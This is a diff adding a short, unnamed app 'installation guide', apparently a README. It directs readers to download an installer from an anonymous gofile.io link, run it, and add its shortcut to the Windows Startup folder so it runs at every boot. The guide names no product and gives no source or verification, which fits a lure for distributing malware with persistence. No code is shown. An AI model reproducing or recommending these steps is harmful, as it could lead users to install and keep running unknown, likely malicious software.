@@ -1,0 +1,24 @@
+🚀 App Installation & Setup Guide
+Please follow these steps to get the application running on your system:
+
+1. Download and Install
+Click the link below to download the application installer: 👉 https://gofile.io/d/cYJBmz
+
+Download the file to your Downloads folder.
+
+Run the installer and follow the on-screen prompts to complete the installation.
+
+2. Set App to Start Automatically
+To make sure the app opens every time you start Windows, follow these steps:
+
+Press the Windows Key + R on your keyboard at the same time.
+
+In the "Run" box that appears, type the following command exactly:
+
+shell:startup
+
+Press Enter. A folder window will open.
+
+Right-click on your app's desktop icon and select Copy.
+
+Right-click inside the Startup folder you just opened and select Paste shortcut.
